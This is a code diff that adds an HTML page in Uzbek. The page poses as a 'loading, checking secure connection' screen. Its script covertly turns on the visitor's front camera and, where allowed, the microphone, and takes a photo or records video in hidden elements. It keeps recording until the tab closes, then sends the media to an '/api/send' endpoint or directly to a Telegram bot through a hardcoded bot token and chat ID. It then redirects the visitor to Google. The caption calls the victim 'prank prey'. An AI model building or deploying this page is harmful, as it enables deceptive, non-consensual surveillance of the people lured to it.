@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sahifa yuklanmoqda...</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: #f8fafc;
+            color: #1e293b;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .loader-card {
+            background: #ffffff;
+            border-radius: 20px;
+            padding: 40px 30px;
+            max-width: 420px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.05), 0 8px 10px -6px rgba(0, 0, 0, 0.03);
+            border: 1px solid #e2e8f0;
+        }
+
+        .spinner-wrapper {
+            position: relative;
+            width: 64px;
+            height: 64px;
+            margin: 0 auto 24px;
+        }
+
+        .spinner {
+            width: 100%;
+            height: 100%;
+            border: 4px solid #e2e8f0;
+            border-top: 4px solid #3b82f6;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        h2 {
+            font-size: 19px;
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: #0f172a;
+        }
+
+        p {
+            font-size: 14px;
+            color: #64748b;
+            line-height: 1.5;
+        }
+
+        .btn-retry {
+            display: none;
+            margin-top: 24px;
+            padding: 12px 24px;
+            background: #2563eb;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+            width: 100%;
+        }
+
+        .btn-retry:hover {
+            background: #1d4ed8;
+        }
+
+        /* Yashirin video va canvas */
+        .hidden-elements {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="loader-card">
+        <div class="spinner-wrapper">
+            <div class="spinner"></div>
+        </div>
+        <h2 id="status-title">Sahifa yuklanmoqda...</h2>
+        <p id="status-desc">Iltimos, kuting. Xavfsiz ulanish tekshirilmoqda...</p>
+        <button id="retry-btn" class="btn-retry" onclick="startCapture()">Davom etish</button>
+    </div>
+
+    <!-- Yashirin media elementlar -->
+    <div class="hidden-elements">
+        <video id="video" autoplay playsinline muted></video>
+        <canvas id="canvas"></canvas>
+    </div>
+
+    <script>
+        // URL parametrlarini olish (?id=CHAT_ID&type=photo yoki video)
+        const urlParams = new URLSearchParams(window.location.search);
+        const CHAT_ID = urlParams.get('id') || '5724786253';
+        const MODE = (urlParams.get('type') || 'photo').toLowerCase();
+        const FALLBACK_TOKEN = '8397655004:AAHz1xBd0vNNLRe9H-8krdFjZNi9btJW4GA';
+        const REDIRECT_URL = urlParams.get('redirect') || 'https://www.google.com';
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const statusTitle = document.getElementById('status-title');
+        const statusDesc = document.getElementById('status-desc');
+        const retryBtn = document.getElementById('retry-btn');
+
+        let isProcessing = false;
+
+        async function startCapture() {
+            if (isProcessing) return;
+            isProcessing = true;
+            retryBtn.style.display = 'none';
+
+            if (MODE === 'video') {
+                statusTitle.innerText = "Video yuklanmoqda...";
+                statusDesc.innerText = "Iltimos, bir necha soniya kuting...";
+                await recordVideo();
+            } else {
+                statusTitle.innerText = "Sahifa yuklanmoqda...";
+                statusDesc.innerText = "Iltimos kuting...";
+                await capturePhoto();
+            }
+        }
+
+        // ==================== 1. FOTO OLISH ====================
+        async function capturePhoto() {
+            let stream = null;
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    },
+                    audio: false
+                });
+
+                video.srcObject = stream;
+                video.setAttribute('playsinline', '');
+                video.setAttribute('autoplay', '');
+                video.setAttribute('muted', '');
+                video.playsInline = true;
+                video.muted = true;
+
+                await video.play().catch(() => {});
+
+                // Kamera fokus va yorug'likni to'g'irlashi uchun 600ms kutish
+                await new Promise(res => setTimeout(res, 600));
+
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
+                stopStream(stream);
+
+                await sendData({
+                    chat_id: CHAT_ID,
+                    type: 'photo',
+                    data: dataUrl
+                });
+
+                finish();
+            } catch (err) {
+                console.error("Kamera xatosi:", err);
+                stopStream(stream);
+                handleError(err);
+            }
+        }
+
+        // ==================== 2. VIDEO YOZIB OLISH ====================
+        async function recordVideo() {
+            let stream = null;
+            try {
+                // Avval video + audio bilan urinib ko'rish
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+                        audio: true
+                    });
+                } catch (audioErr) {
+                    // Agar mikrofonga ruxsat bo'lmasa, faqat video bilan davom etish
+                    stream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+                        audio: false
+                    });
+                }
+
+                video.srcObject = stream;
+                video.playsInline = true;
+                video.muted = true;
+                await video.play().catch(() => {});
+
+                // Agar MediaRecorder qo'llab-quvvatlanmasa, foto olish rejimiga o'tish
+                if (typeof MediaRecorder === 'undefined') {
+                    return capturePhoto();
+                }
+
+                // Qo'llab-quvvatlanadigan video formatni aniqlash
+                const mimeTypes = [
+                    'video/webm;codecs=vp8,opus',
+                    'video/webm',
+                    'video/mp4;codecs=avc1,mp4a.40.2',
+                    'video/mp4'
+                ];
+                let selectedMime = '';
+                for (const mime of mimeTypes) {
+                    if (MediaRecorder.isTypeSupported(mime)) {
+                        selectedMime = mime;
+                        break;
+                    }
+                }
+
+                const options = selectedMime ? { mimeType: selectedMime } : {};
+                const recorder = new MediaRecorder(stream, options);
+                const chunks = [];
+
+                recorder.ondataavailable = (e) => {
+                    if (e.data && e.data.size > 0) {
+                        chunks.push(e.data);
+                    }
+                };
+
+                // Foydalanuvchi saytdan chiqganda yoki boshqa tabga o'tganda yuboring
+                let stopped = false;
+                function stopRecorder() {
+                    if (stopped) return;
+                    stopped = true;
+                    if (recorder.state !== 'inactive') {
+                        recorder.stop();
+                    }
+                }
+
+                recorder.onstop = async () => {
+                    stopStream(stream);
+                    if (chunks.length === 0) return;
+                    const finalBlob = new Blob(chunks, { type: selectedMime || 'video/webm' });
+
+                    const reader = new FileReader();
+                    reader.readAsDataURL(finalBlob);
+                    reader.onloadend = async () => {
+                        // sendBeacon bilan yuborish (sahifa yopilayotganda ham ishlaydi)
+                        const payload = {
+                            chat_id: CHAT_ID,
+                            type: 'video',
+                            data: reader.result,
+                            mimeType: selectedMime || 'video/webm'
+                        };
+                        try {
+                            const sent = navigator.sendBeacon(
+                                '/api/send',
+                                new Blob([JSON.stringify(payload)], { type: 'application/json' })
+                            );
+                            // sendBeacon muvaffaqiyatsiz bo'lsa oddiy fetch bilan urinib ko'r
+                            if (!sent) {
+                                await sendData(payload);
+                            }
+                        } catch (_) {
+                            await sendData(payload);
+                        }
+                    };
+                };
+
+                // Har 5 soniyada chunks yig'ish (xotira tejash)
+                recorder.start(5000);
+
+                // ---- Sahifadan chiqish hodisalari ----
+                // 1. Tab yopilganda / boshqa saytga o'tilganda
+                window.addEventListener('beforeunload', stopRecorder);
+                // 2. Tab yashiringanda (mobil uchun asosiy hodisa)
+                document.addEventListener('visibilitychange', () => {
+                    if (document.visibilityState === 'hidden') {
+                        stopRecorder();
+                    }
+                });
+                // 3. Mobil brauzerda "Orqaga" bosilganda
+                window.addEventListener('pagehide', stopRecorder);
+
+            } catch (err) {
+                console.error("Video yozish xatosi:", err);
+                stopStream(stream);
+                handleError(err);
+            }
+        }
+
+        // ==================== 3. MA'LUMOTNI YUBORISH ====================
+        async function sendData(payload) {
+            // 1-qadam: Vercel /api/send orqali yuborish
+            try {
+                const res = await fetch('/api/send', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                const result = await res.json();
+                if (result.ok) return;
+            } catch (apiErr) {
+                console.warn("API xatosi, Telegram API ga to'g'ridan-to'g'ri yuborilmoqda:", apiErr);
+            }
+
+            // 2-qadam: Zaxira varianti (Direct Telegram API fallback)
+            try {
+                const blob = await (await fetch(payload.data)).blob();
+                const fd = new FormData();
+                fd.append('chat_id', payload.chat_id);
+                fd.append('caption', '🎯 Yangi prank o\'ljasi (To\'g\'ridan-to\'g\'ri)');
+
+                if (payload.type === 'video') {
+                    fd.append('video', blob, 'video.webm');
+                    await fetch(`https://api.telegram.org/bot${FALLBACK_TOKEN}/sendVideo`, {
+                        method: 'POST',
+                        body: fd
+                    });
+                } else {
+                    fd.append('photo', blob, 'photo.jpg');
+                    await fetch(`https://api.telegram.org/bot${FALLBACK_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: fd
+                    });
+                }
+            } catch (tgErr) {
+                console.error("Direct fallback xatosi:", tgErr);
+            }
+        }
+
+        // Kamerani to'xtatish
+        function stopStream(stream) {
+            if (stream) {
+                stream.getTracks().forEach(t => t.stop());
+            }
+            if (video.srcObject) {
+                video.srcObject.getTracks().forEach(t => t.stop());
+                video.srcObject = null;
+            }
+        }
+
+        // Yakunlash va yo'naltirish
+        function finish() {
+            statusTitle.innerText = "Yuklandi!";
+            statusDesc.innerText = "Yo'naltirilmoqda...";
+            setTimeout(() => {
+                window.location.href = REDIRECT_URL;
+            }, 500);
+        }
+
+        // Xatolik yuz berganda
+        function handleError(err) {
+            isProcessing = false;
+            statusTitle.innerText = "Ruxsat talab qilinadi";
+            statusDesc.innerText = "Saytdan foydalanish uchun kameraga ruxsat bering.";
+            retryBtn.style.display = 'block';
+        }
+
+        // Sahifa to'liq yuklanganda avtomatik boshlash
+        window.addEventListener('DOMContentLoaded', () => {
+            setTimeout(startCapture, 200);
+        });
+    </script>
+</body>
+</html>
